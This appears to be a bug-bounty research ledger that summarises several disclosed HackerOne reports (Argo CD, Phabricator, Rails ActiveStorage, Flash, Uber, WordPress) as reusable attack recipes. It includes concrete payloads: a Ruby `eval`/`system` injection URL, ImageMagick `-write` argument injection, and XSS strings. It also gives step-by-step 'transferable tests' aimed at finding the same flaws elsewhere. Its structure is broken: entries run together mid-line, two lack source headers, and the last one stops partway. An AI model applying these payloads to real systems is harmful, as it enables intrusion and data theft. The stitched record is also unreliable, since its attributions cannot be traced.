SOURCE: https://hackerone.com/reports/1847140  2026-11-08
ROUTE: assigned source 1; read via the report JSON endpoint `https://hackerone.com/reports/1847140.json` (HTTP 200, 9,692 bytes, `visibility: full`, `vulnerability_information` 458 chars; both summary fields present — the team summary carries the engineering detail). The operational detail (config flags, the glob example, the sharding/replica condition, the fix versions and the workaround) was completed this pass from the report's own linked public advisory GHSA-6p4m-hw2h-6gmw (`https://github.com/argoproj/argo-cd/security/advisories/GHSA-6p4m-hw2h-6gmw`, fetched this pass, HTTP 200 — the advisory body was read in full; it repeats the team summary verbatim and adds the Limitations/Patches/Workarounds sections). Metadata as served: Internet Bug Bounty, "Argo CD reconciles apps outside configured namespaces when sharding is enabled", severity **high (8.5, rated by the reporter: network / high complexity / low privileges / no user interaction / scope CHANGED / C:H I:H A:H)**, weakness `Improper Access Control - Generic`, CVE-2023-22736, bounty **$2,000**, reporter `czchen`, submitted 2023-01-25, disclosed 2023-03-05. FRESHNESS: Jan 2023 (~3.8 years), patched in Argo CD v2.5.8 / v2.6.0-rc5 — the METHOD (an allow-list enforced in one branch of a feature-flagged/scale-out code path and skipped in the other) transfers, the config flags themselves are current.
STATUS: UNVERIFIED (not reproduced) — no Argo CD instance or Kubernetes cluster was deployed this pass; the flags, the glob example, the trigger condition and the impact sentence are quoted from the report body + the linked advisory.
CLASS: BROKEN ACCESS CONTROL / PRIVILEGE ESCALATION IN A KUBERNETES CONTROLLER — the reconciled-namespace allow-list ("a comma-delimited list of glob patterns") is enforced on the DEFAULT reconciliation path but NOT on the SHARDED path, so enabling the `apps-in-any-namespace` beta feature + Application-controller sharding silently drops the authorization check and an out-of-bounds `Application` is reconciled with the controller's own cluster credentials.
CORE METHOD:
  1. PRECONDITIONS (advisory "Limitations", verbatim): Argo CD **>= 2.5.0-rc1**; the beta feature `apps-in-any-namespace` enabled "by setting `application.namespaces` in the `argocd-cmd-params-cm` ConfigMap or otherwise setting the `--application-namespaces` flags on the Application controller and API server components"; sharding active — "The bug is also limited to Argo CD instances where sharding is enabled by increasing the replicas count for the Application controller"; and an `AppProject` permitting the out-of-bounds namespace, because "the AppProjects' `sourceNamespaces` field acts as a secondary check against this exploit".
  2. THE ALLOW-LIST: "Reconciled Application namespaces are specified as a comma-delimited list of glob patterns. When sharding is enabled on the Application controller, it does not enforce that list of patterns when reconciling Applications." The advisory's example: configured `argocd-*`, controller still reconciles an Application in namespace `other`.
  3. CREATE: place an `Application` CRD in a namespace that does NOT match the configured patterns.
  4. TRIGGER (report verbatim): "Reconciliation of the out-of-bounds Application is only triggered when the Application is updated, so the attacker must be able to cause an update operation on the Application resource" — so the attacker needs create + update on the `Application` CRD, not cluster admin.
  5. RESULT (report Impact, verbatim): "Attacker can use Argo CD permission to deploy resources in Kubernetes." The Application is reconciled by the controller despite being outside every configured namespace.
  6. DIFFERENTIAL / FIX as the tell: patched in v2.5.8 and v2.6.0-rc5; the published workaround is "Running only one replica of the Application controller will prevent exploitation of this bug" — i.e. the vulnerable code path is the SHARDED one.
DETECTION SIGNAL: a controller/operator/GitOps/multi-tenant service whose reconciliation or request handling has an optional scale-out or non-default mode (sharding, replicas > 1, HA / leader-election modes, a beta toggle, `--enable-<feature>` flags) AND whose tenant boundary is expressed as an allow-list of globs/patterns/prefixes; a permission check that lives in the single-instance code path; a resource type that is CREATED under one authorization decision and RECONCILED later under another; any service where enabling a feature flag changes which code branch performs the security-relevant work.
CHAIN: a low-privileged Argo CD user who can create/update an `Application` (primitive: one CRD in a namespace of their choosing) → the SHARDED Application controller skips the namespace-glob allow-list check (primitive: authorization bypass) → Argo CD reconciles the out-of-bounds Application with the Application controller's OWN Kubernetes credentials (escalation: deploy resources outside the permitted namespace) → arbitrary workload/pod creation in the cluster, i.e. cluster-level privilege escalation (final, per the report's own impact line).
TRANSFERABLE TEST: for any controller/operator/GitOps/multi-tenant service with an optional "shard"/"HA"/"scaled" mode or a beta feature flag: run the action that the default mode DENIES in the NON-default branch — enable sharding (bump the controller's replica count) or the feature toggle, create the object in a namespace/tenant/project outside the configured glob allow-list, then UPDATE it, and watch whether the pattern check fires. Rule: **a security check implemented in one branch of a feature-flag / scale-out code path is often absent in the other — test the toggle, not just the default configuration, and note that a create may be inert while the UPDATE is what triggers reconciliation.**
DEDUPE / DELTA (over recorded material): `1847140`, `apps-in-any-namespace`, `Argo CD`, `argo-cd`, `sharding`, `czchen`, `glob pattern`, `CVE-2023-22736` = 0 hits across the three write targets. Pre-existing Kubernetes material REVIEWED and NOT re-recorded (different primitives): the ingress-nginx snippet-annotation Lua injection (#1728174, ledger ~5667), the exposed control-plane/kubelet API scan (#2193, Snapchat), the GitLab CI `environment.kubernetes.namespace` stored XSS (#4954 region), and the managed-control-plane SSRF from a customer provisioning object (#776017). None is an authorization check dropped on a sharded/feature-flagged branch. §17 slot 17.271.

SOURCE: https://hackerone.com/reports/1560717  2026-11-08
ROUTE: assigned source 2; read in full via the report JSON endpoint `https://hackerone.com/reports/1560717.json` (HTTP 200, 10,445 bytes, `visibility: full`, `vulnerability_information` 900 chars; both summary fields empty — the body IS the whole public content and it is complete enough to carry the method). Metadata as served: Phabricator, "Possible to make restricted files public on Phabricator via Diffusion", weakness `Improper Access Control - Generic`, no severity rating in the record, no CVE, bounty **$2,000**, reporter `dyls`, submitted 2022-05-05, disclosed 2022-07-29. FRESHNESS: May 2022 (~4.5 years); upstream Phabricator is archived (the Phorge fork is the live line) — the METHOD (an object-reference/attach syntax whose ACL check exists on the UI write path and not on the VCS/import path) transfers wherever content is ingested from a second channel.
STATUS: UNVERIFIED (not reproduced) — no Phabricator instance was stood up this pass; the access model, the missing-check statement and the file-ID evidence are quoted from the 900-char body.
CLASS: BROKEN ACCESS CONTROL ON A SECOND INGESTION PATH — "attach this object" syntax is permission-checked when a user attaches it in the web UI, but the SAME syntax arriving through a VCS/Differential commit sync is not checked at all, so a restricted file is made public simply by naming it in a commit message; object IDs are sequential, so restricted files are enumerable.
CORE METHOD:
  1. THE ACCESS MODEL (report verbatim): "Files on Phabricator are always viewable to a user if they are attached to an object that they can view. It seems Phabricator does check if you can view a file before allowing you to a attach it. If you don't have access to the file, it will just look like this `{F99999999999}` in plaintext." — i.e. the guard is "render the reference as inert text when the actor cannot view the file".
  2. THE MISSING CHECK (report verbatim): "It seems Phabricator does not do this check when creating commits in Differential repositories."
  3. THE ACTION: put the file-attach syntax `{F<file_id>}` in the COMMIT MESSAGE of a commit landed in a repository that is synced to Phabricator — "This means you make a restricted file public simply by including the syntax to attach the file in the commit message which will then by synced to Phabricator, causing the file to be made public regardless of whether you had access in the first place."
  4. FIND THE TARGET: "It is possible to find a restricted file simply by enumeration" — file IDs are sequential, so a file you were never granted access to can be referenced by guessing its ID.
  5. EVIDENCE PAIR given in the body: a file whose "Can View" is set to Administrator (`F1718695`) is nevertheless "in the commit and viewable" (`F1718696`) to a user who is "not an Administrator" (`F1718697`).
  Impact (verbatim): "Gain access to restricted file objects."
DETECTION SIGNAL: an object-reference / embed syntax that GRANTS or EXPANDS access when the object is "attached" (`{F123}`, `@file`, `[attachment:…]`, `#123`, `!123`, `{{embed}}`, a rendered card/preview); the same attach operation reachable from MORE THAN ONE write path (UI form, public API, VCS/commit-message sync or mirroring, e-mail-in, webhook, importer, migration, template render); a permission check that exists in the UI path only; sequential/enumerable object IDs; a per-object ACL field ("Can View: <role>") that is the whole protection.
CHAIN: any user who can land a commit in a repository synced by the platform (primitive: control over a commit message) → the VCS/Differential ingestion path attaches the referenced object WITHOUT the "may I view this?" check (primitive: authorization bypass on an object reference) → an object whose ACL is "Administrator only" becomes viewable by every user (escalation: disclosure of restricted content) → sequential IDs make it a bulk read of restricted objects (final: confidential-file disclosure).
TRANSFERABLE TEST: find an object-reference syntax that attaches/embeds a restricted object, then replay that reference through EVERY alternative write path instead of the UI — commit message, API, e-mail-in, webhook payload, importer, template — and check whether the ACL check travels with it; then enumerate the object IDs to reference objects you were never granted. Rule: **an ACL check that lives in the web path does not protect the same reference syntax arriving through a background/import/sync path — test the same payload on every ingestion channel.**
DEDUPE / DELTA (over recorded material): `1560717`, `Phabricator`, `Diffusion`, `arcanist`, `dyls`, `{F99999`, "Can View" = 0 hits across the three write targets; the recorded `{...}` material is the Kramdown inline-options Ruby-gadget RCE (§2341 region) — a different class and a different syntax family. Recorded mass-assignment / import entries (`project.json`, `*_ids`) are about attributes, not about an attach-granting reference. §17 slot 17.272.

SOURCE: https://hackerone.com/reports/1652042  2026-11-08
ROUTE: assigned source 4; the assigned report's own JSON body is a 499-char POINTER (it lists three links and the impact line), so the technique was read this pass from all three documents it names, each fetched and read in full: (a) the ORIGINAL report `https://hackerone.com/reports/1154034.json` (HTTP 200, 14,045 bytes, `visibility: full`, `vulnerability_information` 10,444 chars — the code snippets, the four vulnerable patterns, the exact request URLs, the generated `convert` command lines and the three vulnerability write-ups are quoted from this body); (b) the Rails security notice `https://discuss.rubyonrails.org/t/cve-2022-21831-possible-code-injection-vulnerability-in-rails-active-storage/80199` (read in full via `web_extract` — affected/fixed versions, the vulnerable code shape and the allow-list workaround); (c) the Conviso blog post (read in full via `web_extract`; `curl` returned HTTP 429 and `https://r.jina.ai/<url>` returned HTTP 403, so `web_extract` was the route that worked — it confirms the two problems: Code Injection via `send()` and Argument Injection into `convert`). Metadata as served: assigned report = Internet Bug Bounty, "CVE-2022-21831: Possible code injection vulnerability in Rails / Active Storage", severity **high (reporter)**, weakness `Code Injection`, CVE-2022-21831, bounty **$2,000**, reporter `gquadros_`, submitted 2022-07-27, disclosed 2022-09-10; original report = Ruby on Rails, "Argument/Code Injection via ActiveStorage's image transformation functionality", severity **high**, weakness `Code Injection`, reporter `gquadros_`, submitted 2021-04-07, disclosed 2023-07-28. FRESHNESS: audited Apr 2021 (~5.6 years), fixed in Rails 7.0.2.3 / 6.1.4.7 / 6.0.4.7 / 5.2.6.3 — the METHOD (a user-controlled hash KEY reaching `send`, and array-typed params splatting into a CLI-flag builder) transfers to every "transform / format / export" API on any stack.
STATUS: UNVERIFIED (not reproduced) — no Rails app was stood up this pass; the file paths, code snippets, payload URLs, generated command lines and version ranges are quoted from the original report body and the Rails notice.
CLASS: CODE INJECTION + ARGUMENT INJECTION FROM REQUEST PARAMS INTO A RUBY `send()`-BASED TRANSFORMATION DSL WHOSE LEAF IS AN IMAGEMAGICK `convert` ARGV → arbitrary file write (overwrite an ERB template) → RCE.
CORE METHOD:
  1. THE SINK CHAIN (files named in the original body): `activestorage/lib/active_storage/transformers/image_processing_transformer.rb#process` calls `processor.source(file).loader(page: 0).convert(format).apply(operations).call`; `image_processing` `lib/image_processing/chainable.rb#apply` then dispatches EVERY operation with `builder.send(name, *argument)` / `builder.send(name, **argument)` / `builder.send(name, argument)` — there is NO whitelist of operation names; `lib/image_processing/processor.rb#apply_operation` forwards to the accumulator; and `MiniMagick::Tool#method_missing` converts ANY undefined method into a CLI flag: `option = "-#{name.to_s.tr('_', '-')}"; self << option; self.merge!(args)`.
  2. VARIANT A — ARGUMENT INJECTION (fixed operation, user-controlled value, param sent as an ARRAY). Vulnerable pattern: `<%= image_tag user.avatar.variant(resize: params[:new_size]) %>`. Because Rails `params[]` can be an array, request: `https://example.com/controller?new_size[]=123&new_size[]=-set&new_size[]=comment&new_size[]=MYCOMMENT&new_size[]=-write&new_size[]=/tmp/file.erb` → the server generates (report verbatim) `convert ORIGINAL_IMAGE -auto-orient -resize 123 -set comment MYCOMMENT -write /tmp/file.erb /tmp/image_processing20210328-23426-63rmm2.png` → arbitrary file write with attacker-controlled content: "This could be used easily to achieve RCE against Rails applications by overwriting ERB files, for example."
  3. VARIANT B — USER-CONTROLLED OPERATION: pattern `<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>`; request `?t=write&v=/tmp/file2.erb` → `convert ORIGINAL_IMAGE -auto-orient -write /tmp/file2.erb /tmp/image_processing…png` — the same arbitrary file write without needing an array, and "if we consider the original image is usually user-controlled" the written bytes are attacker-controlled too.
  4. VARIANT C — CODE INJECTION via `send`: with the same pattern, `?t=eval&v=system("touch /tmp/hacked")` → `builder.send("eval", 'system("touch /tmp/hacked")')` and "the Ruby code `system("touch /tmp/hacked")` would be executed".
  5. PRECONDITIONS / VERSIONS (Rails notice verbatim): impact requires Active Storage + the `image_processing` gem + the `mini_magick` back end; vulnerable code shape `<%= image_tag blob.variant(params[:t] => params[:v]) %>` "where the transformation method or its arguments are untrusted arbitrary input"; affected `>= 5.2.0`, fixed 7.0.2.3 / 6.1.4.7 / 6.0.4.7 / 5.2.6.3; workaround = "implement a strict allow-list on accepted transformation methods or arguments" plus a strict ImageMagick policy. Tested versions in the report: activestorage 6.1.3.1, image_processing 1.12.1, mini_magick 4.11.0. The body also notes the docs said nothing about the danger of passing user values to `variant()`/`preview()`.
DETECTION SIGNAL: any Ruby/Rails (or similar dynamic-language) endpoint where an image/asset transformation is BUILT FROM REQUEST PARAMS — a param NAME or VALUE flowing into `variant(...)`/`preview(...)`/`apply(...)`; ARRAY-typed parameters (`x[]=`) reaching a method that splats (`*argument`) into a CLI builder; `send`/`public_send` receiving a user-controlled METHOD NAME; framework docs/examples that show `variant(params[...])`; MiniMagick/ImageMagick — or any `method_missing`-to-CLI-flags wrapper (ffmpeg/exiftool/ghostscript helpers) — in the lockfile.
CHAIN: any account able to own/upload an image and reach the transformer (primitive: control over one param name or value) → `apply()` calls `builder.send(<name you chose>, *<args you chose>)` with no whitelist, and MiniMagick maps that name to a `convert` flag (primitive: arbitrary method call + arbitrary CLI arguments) → `-write /path` (or `-set comment` + array splat) writes attacker-controlled bytes anywhere, and `eval` executes arbitrary Ruby (escalation: arbitrary file write / code execution) → overwrite an ERB template with the written file (or point the write at a path the app loads) → RCE on the application server (final).
TRANSFERABLE TEST: for every parameter that reaches a transformation/format/export API: (1) send it as an ARRAY (`t[]=a&t[]=b`, `v[]=…`) and see whether the extra elements become separate arguments of the spawned command — then inject the flag your tool uses to write to a path (ImageMagick `-write /tmp/x`, `-set comment …`); (2) when the param NAME selects the operation, try a method that must never be callable (`eval`, `system`, `instance_eval`, `send`) and look for a side effect; (3) always test the codebase's own documented dynamic pattern (`variant(params…)`, `preview(params…)`). Rule: **a `send(<user input>, *user_args)` DSL is BOTH an argument-injection and an arbitrary-method-call sink, and once the sink is a CLI-flag builder, arbitrary FILE WRITE is one flag away.**
DEDUPE / DELTA (over recorded material): `1652042`, `1154034`, `image_processing`, `MiniMagick`, `mini_magick`, `public_send`, `mogrify` = 0 hits across the three write targets; pre-existing `Active Storage` / `ActiveStorage` material REVIEWED and NOT re-recorded (different primitives): the Active Storage blob `Set-Cookie` + `Cache-Control: public` session-cookie cache leak (CVE-2024-26144, ledger source #3082917 and §17.119) and the ActionText `action-text-attachment` raw-element entry. Pre-existing `argument injection` material REVIEWED and NOT re-recorded: §13.7 libssh `ProxyCommand` (A 1 / C 1, entry-point value is a URL/path), the GitLab git-flag injection family (#2293731, #658013, "directory-name-as-flag"), and the ImageMagick content-sniff/Ghostscript ImageTragick entries (#402362 `%pipe%`; the `%!`-magic `shop[header]` upload) — all of which inject into an argv through a FILE/NAME, whereas this entry's primitive is a param NAME that becomes the METHOD NAME plus an ARRAY that splats into flags. §17 slot 17.273.

SOURCE: https://hackerone.com/reports/73276  2026-11-08
ROUTE: assigned source 5; read in full via the report JSON endpoint `https://hackerone.com/reports/73276.json` (HTTP 200, 8,014 bytes, `visibility: full`, `vulnerability_information` 942 chars; both summary fields empty, so the body IS the whole public record and it gives the entry point, the per-browser schemes and the chain). FRESHNESS: submitted 2015-06-30 (reporter `jouko`), disclosed 2019-10-18, "The vulnerability was patched in May 2015" (report verbatim) and Flash Player reached EOL 2020-12-31 — the VECTOR is dead; only the METHOD (the DELIVERY SCHEME, not the origin, selects the sandbox level, and a local sandbox can be promoted to trusted) transfers. Metadata as served: Internet Bug Bounty, "Internet-based attacker can run Flash apps in local sandboxes by using special URL schemes (PSIRT-3299, CVE-2015-3079)", weakness `Information Disclosure`, no severity rating in the record, CVEs **CVE-2015-3044 + CVE-2015-3079**, bounty **$2,000**.
STATUS: UNVERIFIED (not reproduced) — Flash Player is EOL since 2020-12-31, the public body carries NO PoC code (no SWF, no page source), and no lab was built; every claim below is quoted from the 942-char body.
CLASS: SANDBOX-LEVEL CONFUSION BY URL SCHEME (local-sandbox escape) → same-origin-policy bypass: content delivered over `data:`/`blob:` is classified as LOCAL content rather than as the hosting web origin, so it starts in a more privileged sandbox ("local with files" / "local with networking") which can then be promoted to "local trusted".
CORE METHOD:
  1. DELIVER ACTIVE CONTENT WITHOUT A REMOTE ORIGIN (report verbatim): "A website can deploy an SWF file via the `data:` or `blob:` URL schemes (perhaps others)." Per-browser detail from the body: "On Chrome, the SWF can simply be encoded in a `data:` URL. This doesn't appear to work on other browsers (maybe there is a limit on the URL length or something else). On Firefox, Safari (recent versions, not version 5), and Chrome also allow loading the SWF from a `blob:` URL. On Firefox this apparently requires prefixing the URL with `feed:`."
  2. WRONG SANDBOX (report verbatim): "An app started in this way runs in the 'local with files' or 'local with networking' sandbox, depending on the SWF attributes" — i.e. the SCHEME, not the origin, decided the trust level, and the app is not confined to the attacker's web origin.
  3. PROMOTE AND ESCAPE (report verbatim): "This bug can be used in conjunction other attacks such as the Firefox-specific bug reported separately or MITM (CVE-2015-3044) to promote the local sandbox to 'local trusted'. This would allow unlimited cross-domain access."
  4. PATCH: "The vulnerability was patched in May 2015."
DETECTION SIGNAL: embedded active content that the target loads but whose DELIVERY SCHEME it does not pin — a viewer/renderer that accepts `data:`, `blob:`, `filesystem:`, `srcdoc` or another local-ish scheme as a top-level or framed document (plugin, PDF/office/SVG viewer, applet, custom renderer, webview); a component whose threat model assumes "remote origin therefore web sandbox"; content attributes that select the sandbox (`allow-same-origin`, sandbox flags, local-file access flags); any capability that differs between content served from a real URL and the same bytes served from a scheme URL.
CHAIN: attacker page (primitive: a web page whose URL points at their content via `data:`/`blob:` — Chrome accepts a base64 `data:` URL, Firefox additionally needs the `feed:` prefix for `blob:`) → the browser starts the app in the "local with files" / "local with networking" sandbox instead of the web-origin sandbox (primitive: the scheme determined the sandbox level) → combined with a browser bug or MITM (CVE-2015-3044) the sandbox is promoted to "local trusted" (escalation) → "unlimited cross-domain access" with the victim's credentials plus local-file reach (final: SOP bypass → cross-origin data theft / internal file read).
TRANSFERABLE TEST: take the same bytes of whatever active content the target embeds and change ONLY the delivery scheme — real URL vs `data:` URL (base64; Chrome) vs `blob:` URL (Firefox: prefix `feed:`) — then compare the privileges the viewer grants in each case: same-origin fetches, local file reads, cross-domain requests, whether the embedder's own permissions apply. A trust difference between two deliveries of identical bytes is the bug class. Rule: **ask whether the SCHEME, not the ORIGIN, selects the sandbox — and whether scheme-delivered content is treated as local/trusted by the embedder.**
DEDUPE / DELTA (over recorded material): `73276`, `PSIRT-3299`, `local with files`, `local with networking`, `local trusted`, `CVE-2015-3044`, `feed:` = 0 hits across the three write targets. Related-but-distinct recorded material REVIEWED and NOT re-recorded: the recorded `data:` → `blob:` conversion removed by Shopify (ledger ~line 3494) and the sanitizer `data:`/`blob:`/`srcdoc` allow-list entry (~line 5971) are both about CONTENT EXECUTION in the page's own origin (SVG script execution), not about which SANDBOX the scheme assigns; the Flash memory-corruption family recorded in batch 26 is a different class. NOT promoted to §17: dead technology, no PoC in the public body, and the modern analogue (an embedded viewer whose trust level depends on the delivery scheme) was not tested here.

STATUS: UNVERIFIED (not reproduced) — no target was touched, and honestly: the public body contains NO payload and NO request, so this entry records the ENTRY POINT and the MECHANISM only, not a payload.
CLASS: STORED XSS VIA A THIRD-PARTY, PUBLICLY-EDITABLE CONTENT SOURCE — the target renders a document that anyone on the internet can edit (a Google Sheet) on its own subdomains, so attacker markup typed into a CELL is served from the TARGET's origin to every visitor.
CORE METHOD (the full published text of the technique, team summary verbatim): "A publicly-editable Google Sheet rendered on various `ubermovement.com` subdomains allowed anyone to inject HTML content into the page. It was possible for an attacker to inject malicious JavaScript code into the page by editing cells within the sheet, which would then be loaded by anyone who viewed the site."
  1. ENTRY POINT: find a page on the target that renders content from a third-party document the PUBLIC can edit — here a publicly-editable Google Sheet, rendered on "various `ubermovement.com` subdomains".
  2. EDIT THE SOURCE (no account or authorization on the target is needed): put markup / JavaScript into the content the target consumes — a sheet cell.
  3. RENDER: load the target's page; the injected script runs in the target's origin and is served to "anyone who viewed the site" — stored XSS, which is what earned the $2,000 medium.
  NOT PUBLISHED (stated, not guessed): the fetching/rendering path (iframe vs fetched HTML/CSV/JSON vs a chart library) and the payload.
DETECTION SIGNAL: any target page whose content comes from a document the PUBLIC can edit — a published Google Sheet/Doc (`docs.google.com/spreadsheets/…` in `pubhtml` / `gviz/tq` / `export?format=csv` form), an Airtable base, a Notion/Coda page, a public Trello board, a public dashboard (Datawrapper, Tableau Public, Looker Studio), an RSS/JSON feed, or an "embed this sheet" widget; the target's own origin renders that content (`srcdoc`, `innerHTML`, `dangerouslySetInnerHTML`, a template concatenating cells) or frames it; the source document's edit link is public.
CHAIN: attacker edits a publicly-editable Google Sheet (primitive: unauthenticated write of markup into a cell) → the target site reads that document and renders it inside its own pages, trusting the third party to escape (primitive: stored injection into the target origin) → the script executes in the target's origin for every visitor (final: stored XSS with session/CSRF impact — act as the victim; program rated it medium, $2,000).
DETECTION/TRANSFERABLE TEST: enumerate every third-party embed on the target (`docs.google.com/spreadsheets|document`, `airtable.com`, `notion.site`, public dashboards, feeds) and recover the document ID; edit a cell to `<img src=x onerror=alert(document.domain)>` (then try `"><script>` and a formula/`IMPORT*-style` fetch) and load every page of the target that consumes that document. The finding exists ONLY if the marker executes in the TARGET's origin — if it executes in the third party's origin it is that third party's XSS, not the target's. Rule: **a publicly-editable document rendered by the target is remote content the attacker fully controls, so the escaping question moves from the target's own inputs to a third party's output that the target never sees in a form.**
DEDUPE / DELTA (over recorded material): `193799`, `ubermovement`, `Google Sheet`, `pubhtml`, `gviz`, `docs.google`, `reptou` = 0 hits across the three write targets; the recorded `spreadsheet` hits are mass-assignment / Azure-Function-API contexts, not a content source. SOURCE: https://hackerone.com/reports/151470  2026-11-08
ROUTE: assigned source 3; read in FULL via the report JSON endpoint `curl -A "<desktop UA>" -H 'Accept: application/json' https://hackerone.com/reports/151470.json` (HTTP 200, 8,247 bytes, `visibility: full`, `vulnerability_information` 1,127 chars) — the entire public body is the reporter's steps, quoted below. Metadata as served: Uber, "[IODR] Get business trip via organization id", weakness `Improper Authentication - Generic`, bounty **$2,000**, reporter `severus`, submitted 2016-07-15, disclosed 2016-08-15. FRESHNESS: Jul 2016 (~10.3 yrs) — `business.uber.com/server/...` is the retired Uber-for-Business console; the METHOD (an ownership check attached to ONE handler of an object and missing on its sibling) is what transfers.
STATUS: UNVERIFIED (not reproduced) — no Uber asset touched; the request URL, the steps and the error blob are quoted from the public body.
CLASS: IDOR / BOLA (cross-tenant READ) — an object/tenant id in the PATH is not ownership-checked on a sub-resource handler, so any account reads another organisation's data.
CORE METHOD (reporter's steps, verbatim structure):
  1. ENTRY POINT: `https://business.uber.com/server/organizations/[id]/trips2?per_page=15&requestAtStart=&requestAtStop=&count=true`.
  2. Call it with YOUR `organization_id` (returns your trips).
  3. "Chang to victim organization" — replace `[id]` with a victim org id: "If valid id, it will return result" (the victim organisation's business trips).
  4. The id is obtainable: "As previous I report #151465, I can get organization id or just enum it (very difficult)."
  5. THE REUSABLE ATOM (the delta): the SAME object id is PROTECTED on a sibling sub-resource — report verbatim "In `employee_invites`, it return 403." So the ownership check exists on `…/employee_invites` under the same `/organizations/<id>/` prefix but was never applied to `…/trips2`.
  6. Chain-only leak (invalid ids): an invalid id returns an internal RPC error naming the validation rule plus an internal IP — `{"error":{"name":"TchannelUnexpectedError","fullType":"tchannel.unexpected","type":"tchannel.unexpected","message":"Unexpected Error: 'validation_error.must_be_a_valid_uuid_v4'","isErrorFrame":true,"codeName":"UnexpectedError","errorCode":5,"originalId":2,"remoteAddr":"10.160.14.41:21306"}}`.
DETECTION SIGNAL: an object/tenant id in the URL PATH of a console's OWN server path (`/server/<obj>/<id>/…`); MORE THAN ONE sub-resource hanging off the same `<id>` (here `trips2` AND `employee_invites`); one sub-resource answering 403 for a foreign id while its sibling answers 200 with data — the authz filter is attached per-HANDLER, not per-OBJECT; a thin HTTP layer in front of an internal RPC service (tchannel) whose errors leak the backend validation predicate and internal `remoteAddr`.
CHAIN: any authenticated business-console account (primitive: one ordinary account, no privilege) → substitute a victim organisation id into `/server/organizations/<id>/trips2` (primitive: object id in the path never ownership-checked on this handler) → the response is another organisation's trip list — times/locations = employee PII (escalation: cross-tenant read) → enumerate/leverage previously-leaked org ids (reporter cross-references #151465) (final: cross-tenant disclosure of business-trip data; $2,000).
TRANSFERABLE TEST: for every object id that appears in a path or body, enumerate EVERY sub-resource and verb under the SAME object prefix (`/<obj>/<id>/<a>`, `/<obj>/<id>/<b>`, `/<obj>/<id>/<c>`) and push a FOREIGN id through EACH — one handler that 403s proves the object IS protected there, so hunt the SIBLING handler that returns 200. Rule: **when one sub-resource of an object denies a foreign id and another returns data, the ownership check is per-handler — map every handler of the object and send the same foreign id to each.** (This REFINES the recorded sibling-route lesson, which is phrased for `.json`/`.xml` FORMAT siblings; here the siblings are DIFFERENT sub-resources of one object.)

FRESHNESS: May 2015 (~11.5 yrs) — "The bug was patched in April 2015 and additional hardening in May 2015" (body verbatim), Flash Player EOL 2020-12-31, so the VECTOR is dead; only the METHOD transfers.
STATUS: UNVERIFIED (not reproduced) — Flash is EOL, the public body carries NO PoC (no SWF, no page source) and no lab was built; every claim below is quoted from the 601-char body.
CLASS: CLIENT-SIDE ORIGIN SPOOFING → cross-origin access to a plugin's per-origin local storage (Flash "Local Shared Objects"): the embedder derives a Flash app's ORIGIN/trust from a URL it parses but does not validate, so attacker content inherits ANY site's origin and can then read/write that origin's LSO — including the global `macromedia.com` settings object (camera/microphone permissions).
CORE METHOD (body verbatim where quoted):
  1. HOST SPOOF — run a malicious Flash app whose perceived host is any target site. Mechanism named in the body: "The bug can be exploited with malformed `jar:` URLs on Firefox. Other browsers require other ways of spoofing the host, e.g. HTTP MITM or DNS spoofing."
  2. CROSS-ORIGIN LSO READ/WRITE: "The vulnerability allows a malicious Flash app on a website to read and write Local Shared Objects belonging to any website." (An LSO is Flash's per-origin store, keyed by host.)
  3. THE PRIVILEGED TARGET: "As a special case, LSO's of `macromedia.com` contain global Flash settings. Overwriting them allows e.g. unlimited access to camera and microphone of the target user."
  4. SECONDARY IMPACT named: "disclosure of sensitive information in LSO's (website-dependent) and triggering the double free bug in Flash Player Settings Manager reported separately."
  5. PATCH: "The bug was patched in April 2015 and additional hardening in May 2015."
DETECTION SIGNAL: an embedded active-content host / viewer / webview that decides the content's ORIGIN or TRUST LEVEL from a URL STRING rather than from where the bytes were actually delivered — plugins/applets, PDF/Office/SVG viewers, custom URL-scheme handlers (`jar:`, `feed:`, `blob:`, `data:`), any "load content from this URL and treat it as from that site" path; per-origin client-side storage (localStorage / IndexedDB / LSO / cookies scoped to the spoofed host) reachable by the embedded content; a GLOBAL/privileged settings object keyed to a well-known host (Flash's `macromedia.com`).
CHAIN: attacker page hosts malicious active content (primitive: attacker-controlled code) → the embedder parses a malformed `jar:` URL (Firefox) — or the attacker MITMs / spoofs DNS on other browsers — so the app's perceived host becomes the victim site (primitive: origin spoofed from an unvalidated URL) → the app reads/writes LSOs belonging to ANY host (primitive: cross-origin client-side-storage access) → it overwrites the global `macromedia.com` LSO holding Flash device permissions (escalation) → "unlimited access to camera and microphone of the target user" (final: device/sensor takeover + cross-site data disclosure; dead on modern browsers).
TRANSFERABLE TEST: for any component that renders/embeds active content, deliver the SAME bytes twice — once from a real URL on the attacker origin, once via an alternate scheme/transport (`data:`, `blob:`, `jar:`, `feed:`, an MITM'd response, a spoofed DNS name) — and compare the ORIGIN the component assigns and the per-origin storage the content can reach. If the scheme or the spoofed host changes WHICH origin's client-side storage the content can read, that is the bug class. Rule: **ask whether the EMBEDDER decides origin/trust from a URL it PARSES instead of from where the bytes came — and whether that origin namespaces client-side storage the attacker can then read or overwrite.**

The recorded #73276 entry itself NAMES CVE-2015-3044 as the SEPARATE promotion primitive ("combined with a browser bug or MITM (CVE-2015-3044)") — i.e. this report IS that primitive, so the two are the two halves of one chain, not one technique recorded twice. SOURCE: https://hackerone.com/reports/126099  2026-11-08
ROUTE: assigned source 1; read in FULL via the report JSON endpoint `curl -A "<desktop UA>" -H 'Accept: application/json' https://hackerone.com/reports/126099.json` (HTTP 200, 6,152 B, `visibility: full`, `vulnerability_information` 3,140 chars — the reporter's whole write-up, quoted below). Metadata as served: Uber, "Stored XSS in drive.uber.com WordPress admin panel", weakness `Cross-site Scripting (XSS) - Generic`, bounty **$2,000**, reporter `jouko`, submitted 2016-03-26, disclosed 2016-05-14. FRESHNESS: Mar 2016 (~10.6 yrs) — the concrete plugin/stack is gone; the METHOD (an unhandled exception whose message carries the request, persisted into a privileged error banner and rendered unfiltered) is what transfers.
STATUS: UNVERIFIED (not reproduced — no WordPress instance was stood up; the request, the parameter and the escalation are quoted from the public body)
CLASS: STORED XSS in an ADMIN-ONLY ERROR/NOTICE surface reached from an UNHANDLED EXCEPTION whose message reflects attacker input → JavaScript in the WordPress administrator's session → RCE (create-admin via AJAX, or PHP write via the plugin/theme editor) · CWE-79 → CWE-94
CORE METHOD (reporter's steps, verbatim structure):
  1. ENTRY POINT: the All-in-One Event Calendar plugin's widget render path — `GET /oh/?ai1ec_js_widget=ai1ec_agenda_widget&render=true&events_per_page=$%&xss=<svg/onload=alert(/stored-xss/.source)>`.
